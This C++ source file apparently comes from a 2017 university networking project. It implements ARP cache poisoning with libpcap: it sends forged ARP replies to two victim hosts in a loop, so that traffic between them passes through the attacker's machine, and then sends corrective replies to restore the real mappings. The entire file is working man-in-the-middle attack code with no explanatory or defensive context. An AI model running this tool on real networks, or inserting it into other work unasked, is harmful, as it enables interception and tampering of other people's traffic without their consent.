//
//  pds-spoof.cpp
//  pds-project
//
//  Created by Jordán Jarolím on 22.04.17.
//  Copyright © 2017 FIT VUTBR. All rights reserved.
//

#include "pds-spoof.hpp"
#include "types.h"


using namespace std;
bool regenerate = false;

void PdsSpoof::spoofIt(string interface, string ip1, string ip2, string mac1, string mac2, string myMac, unsigned int timer){
    char error_buffer[PCAP_ERRBUF_SIZE] = "\0";
    pcap_t *pcap = pcap_open_live(interface.c_str(), sizeof(struct ether_header) + sizeof(struct ether_arp), true, 0, error_buffer);
    Packet packet = Packet();
    
    /* Convert macs to its byte representation */
    unsigned char byteV1Mac[6];
    unsigned char byteV2Mac[6];
    unsigned char byteMyMac[6];
    int waiting = timer*1000;
    packet.simplifyMac(mac1, byteV1Mac);
    packet.simplifyMac(mac2, byteV2Mac);
    packet.simplifyMac(myMac, byteMyMac);
    
    while (!regenerate) {
        packet.sendPacket(pcap, byteV2Mac, byteMyMac, byteV2Mac, byteMyMac, ip1, ip1, ARPOP_REPLY);
        packet.sendPacket(pcap, byteV1Mac, byteMyMac, byteV1Mac, byteMyMac, ip2, ip2, ARPOP_REPLY);
        usleep(waiting);
    }
    usleep(1000000);
    for (int i = 0; i < 1000; i++){
        packet.sendPacket(pcap, byteV2Mac, byteV1Mac, byteV2Mac, byteV1Mac, ip1, ip1, ARPOP_REPLY);
        packet.sendPacket(pcap, byteV1Mac, byteV2Mac, byteV1Mac, byteV2Mac, ip2, ip2, ARPOP_REPLY);
        usleep(1000);
    }
    
    pcap_close(pcap);
}
